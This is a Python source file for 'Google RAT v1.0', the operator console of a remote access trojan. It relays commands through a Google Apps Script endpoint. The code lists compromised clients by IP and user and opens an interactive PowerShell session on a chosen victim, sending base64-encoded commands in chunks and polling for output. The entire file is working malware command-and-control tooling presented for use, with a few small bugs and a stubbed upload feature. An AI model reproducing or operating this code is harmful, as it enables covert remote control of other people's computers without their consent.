import base64
import logging
import requests
import argparse

CHUNK_SIZE = 35000
LOG_FORMAT = '[%(asctime)s][%(levelname)s] %(message)s'
BANNER = """
*******************************************************************************
Google RAT v1.0
*******************************************************************************
# view help:
python script.py -h
# connect to server
python script.py https://script.google.com/macros/s/dfjlksdf/exec
*******************************************************************************
"""

class Shell(object):
  BANNER = """
          ___
    . -^   `--,
   /# =========`-_        +-+-+-+-+ +-+-+ +-+-+-+-+ +-+-+-+ +-+-+-+
  /# (--====___====\      |S|H|O|W| |M|E| |W|H|A|T| |Y|O|U| |G|O|T|
 /#   .- --.  . --.|      +-+-+-+-+ +-+-+ +-+-+-+-+ +-+-+-+ +-+-+-+
/##   |  * ) (   * ),                           Author: Aaron Reyes
|##   \    /\ \   / |
|###   ---   \ ---  |
|####      ___)    #|     Type 'help' for a list of commands
|######           ##|
 \##### ---------- /
  \####           (
   `\###          |
     \###         |
      \##        |
       \###.    .)
        `======/
  """

  def __init__(self, srv):
    self.srv = srv
    self.hosts = []
    logging.info('connecting to {}'.format(self.srv))
    r = requests.get(args.srv)
    if r.status_code != requests.codes.ok:
      logging.error('server not responding. response: {0}'.format(r.status_code))
    else:
      logging.info('success. server is up!')
    print(self.BANNER)

  def __run(self, ip, user, cmd):
    s = ip + '|' + user
    cmdx = base64.b64encode(cmd.encode('UTF-16LE')).decode('UTF-8')
    # check if last command has been run
    while True:
      r = requests.get(args.srv, params={'TxR': '{0}'.format(base64.b64encode(s.encode('UTF-8')).decode('UTF-8'))})
      if r.status_code != requests.codes.ok:
        logging.error('request failed: {0}'.format(r.status_code))
        return ''
      logging.info('TxR: {0}'.format(r.content.decode('UTF-8')))
      if r.content.decode('UTF-8') == '0':
        break
    # send data
    col = 3
    for i in range(0, len(cmdx), CHUNK_SIZE):
      r = requests.post(args.srv, params={'Tx': '{0}'.format(base64.b64encode(''.join([s, '|', str(col)]).encode('UTF-8')).decode('UTF-8'))}, data={'d': cmdx[i:i+CHUNK_SIZE]})
      if r.status_code != requests.codes.ok:
        logging.error('request failed: {0}'.format(r.status_code))
        return ''
      logging.info('TxD[{0}]: {1}'.format(col - 3, cmdx[i:i+CHUNK_SIZE]))
      col = col + 1
    # set data type
    r = requests.post(args.srv, params={'Tx': '{0}'.format(base64.b64encode(''.join([s, '|2']).encode('UTF-8')).decode('UTF-8'))}, data={'d': '@'})
    if r.status_code != requests.codes.ok:
      logging.error('request failed: {0}'.format(r.status_code))
      return ''
    # loop for response
    while True:
      r = requests.get(args.srv, params={'RxR': '{0}'.format(base64.b64encode(s.encode('UTF-8')).decode('UTF-8'))})
      if r.status_code != requests.codes.ok:
        logging.error('request failed: {0}'.format(r.status_code))
        return ''
      logging.info('RxR: {0}'.format(r.content.decode('UTF-8')))
      if r.content.decode('UTF-8') == '1':
        break
    # download response
    col = 3
    buf = []
    while True:
      r = requests.get(args.srv, params={'RxD': '{0}'.format(base64.b64encode(''.join([s, '|', str(col)]).encode('UTF-8')).decode('UTF-8'))})
      if r.status_code != requests.codes.ok:
        logging.error('request failed: {0}'.format(r.status_code))
        return ''
      if r.content.decode('UTF-8') == '':
        break
      logging.info('RxD[{0}]: {1}'.format(col - 3, r.content.decode('UTF-8')))
      buf.append(base64.b64decode(r.content.decode('UTF-8')).decode('UTF-8'))
      col = col + 1
    # ACK download of data
    r = requests.post(args.srv, params={'Rx': '{0}'.format(base64.b64encode(''.join([s, '|2']).encode('UTF-8')).decode('UTF-8'))}, data={'d': '0'})
    if r.status_code != requests.codes.ok:
      logging.error('request failed: {0}'.format(r.status_code))
      return ''
    # decode result
    return ''.join(buf)

  def help(self):
    print('ls         - list all active clients')
    print('shell <ip> - drop into a powershell session with <ip>')
    print('quit       - exit')

  def ls(self):
    r = requests.get(args.srv, params={'ls': ''})
    if r.status_code != requests.codes.ok:
      logging.error('failed to execute "ls" command. response: {0}'.format(r.status_code))
    else:
      hosts = []
      raw = r.content.decode('UTF-8').split('|')
      for ip,user in zip(raw[0::2], raw[1::2]):
        if ip and user:
          hosts.append({'ip': ip, 'user': user})
          logging.info('client found: {0}@{1}'.format(user, ip))
      if not hosts:
        logging.info('no hosts found')
      self.hosts = hosts

  def run(self, ip):
    logging.info('enter "quit" to exit shell')
    if not self.hosts:
      logging.error('no hosts loaded. try running "ls"')
      return
    if ip in [d['ip'] for d in self.hosts]:
      user = [d['user'] for d in self.hosts if d['ip'] == ip][0]
    else:
      logging.error('invalid ip: {0}'.format(ip))
      return
    while True:
      cmd = input('{0}@{1} PS> '.format(user, ip)).lower()
      if cmd in ['e', 'q', 'exit', 'quit']:
        logging.info('exiting shell on {0}'.format(ip))
        break
      if cmd.strip():
        print(self.__run(ip, user, cmd))

  def upload(self):
    pass

if __name__ == '__main__':
  # parse user arguments
  parser = argparse.ArgumentParser(usage=BANNER)
  parser.add_argument('srv', help='google apps server URL', type=str)
  parser.add_argument('-l', dest='logging_level', default='INFO', help='logging level for output', type=str)
  args = parser.parse_args()
  # setup logger
  logging.basicConfig(format=LOG_FORMAT, datefmt='%d %b %Y %H:%M:%S', level=args.logging_level)
  # create user shell
  sh = Shell(args.srv)
  # accept user input for hosts
  while True:
    cmd = input('> ').lower()
    if cmd == 'help':
      sh.help()
    if cmd == 'ls':
      sh.ls()
    if cmd.startswith('shell'):
      sh.run(cmd.replace('shell', '').strip())
    if cmd.startswith('upload'):
      sh.upload(cmd.replace('upload', '').strip())
    if cmd in ['e', 'q', 'exit', 'quit']:
      break
